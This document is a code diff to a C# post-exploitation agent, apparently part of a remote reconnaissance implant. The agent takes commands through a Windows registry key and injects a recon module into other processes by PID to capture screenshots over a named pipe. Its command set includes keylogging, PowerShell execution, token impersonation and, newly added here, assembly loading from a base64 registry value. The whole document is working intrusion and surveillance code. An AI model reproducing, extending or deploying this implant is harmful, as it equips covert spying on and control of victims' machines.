@@ -8,9 +8,11 @@ using System.IO.Pipes;
 using System.Threading;
 using ReflectiveInjector;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
 
 namespace RemoteReconCore
 {
+    [ComVisible(true)]
     public class Agent
     {
         public Agent()
@@ -24,13 +26,14 @@ namespace RemoteReconCore
             RegistryKey hklm = Registry.LocalMachine;
 
             //Get the recon module from the embedded resource
-            mod = GetReconModule();
+            //mod = GetReconModule();
 #if DEBUG
             Console.WriteLine("Opening Remote Recon base key");
 #endif
             if ((rrbase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
                 System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/
 
+            modkey = runkey;
             while (rrbase.GetValue(runkey) != null)
             {
                 //main loop
@@ -53,6 +56,7 @@ namespace RemoteReconCore
                         rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
                         rrbase.SetValue(commandkey, 0);
                         rrbase.SetValue(argumentkey, "");
+                        //rrbase.SetValue(runkey, "");
                         command = new KeyValuePair<int, object>(0, "");
                         break;
                     case (int)Cmd.Screenshot:
@@ -64,6 +68,7 @@ namespace RemoteReconCore
                         else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                         rrbase.SetValue(commandkey, 0);
                         rrbase.SetValue(argumentkey, "");
+                        rrbase.SetValue(runkey, "");
                         command = new KeyValuePair<int, object>(0, "");
                         break;
                     default:
@@ -87,6 +92,7 @@ namespace RemoteReconCore
 #if DEBUG 
                 Console.WriteLine("Received Screenshot command");
 #endif
+                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                 GetScreenShot(Convert.ToInt32(command.Value));
             }
         }
@@ -95,9 +101,11 @@ namespace RemoteReconCore
         private static WindowsImpersonationContext context = null;
         //private string exceptionInfo;
         private byte[] mod;
+        public static string modkey;
         public static KeyValuePair<int, object> command;
         public static KeyValuePair<int, object> result;
         RegistryKey rrbase;
+
         public enum Result : int
         {
             Success = 0,
@@ -105,7 +113,8 @@ namespace RemoteReconCore
             ScreenShotFailed = 2,
             KeylogFailed = 3,
             ImpersonateFailed = 4,
-            PSFailed = 5
+            PSFailed = 5,
+            AssemblyFailed = 6
         }
 
         public enum Cmd : int
@@ -114,8 +123,10 @@ namespace RemoteReconCore
             Keylog = 2,
             Screenshot = 3,
             PowerShell = 4,
-            Revert = 5
+            Revert = 5,
+            Assembly = 6
         }
+
         private void impersonate(int pid)
         {
             IntPtr hProcHandle = IntPtr.Zero;
@@ -148,6 +159,7 @@ namespace RemoteReconCore
             //Inject the recon module into the target process.
             byte[] patchedMod = PatchRemoteReconNative("screenshot");
             Injector screenshot = new Injector(pid, patchedMod);
+            
 #if DEBUG
             Console.WriteLine("Created screenshot object");
 #endif
@@ -159,12 +171,15 @@ namespace RemoteReconCore
 #if DEBUG
                 Console.WriteLine("Attempting to connect to named pipe");
 #endif
+
                 try
                 {
-                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_shot", PipeDirection.InOut);
+                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);
+                    
                     client.Connect((1000 * sleep));
                     StreamReader reader = new StreamReader(client);
-                    image = reader.ReadToEnd();
+                    image = reader.ReadLine();
+                    
                     client.Close();
                     client.Dispose();
 #if DEBUG
@@ -176,6 +191,7 @@ namespace RemoteReconCore
                 {
 #if DEBUG
                     Console.WriteLine("Connect to namedpipe failed");
+                    File.AppendAllText("c:\\agent.log", "Connect to named pipe failed\n");
 #endif
                     result = new KeyValuePair<int, object>(2, e.ToString());
                 }
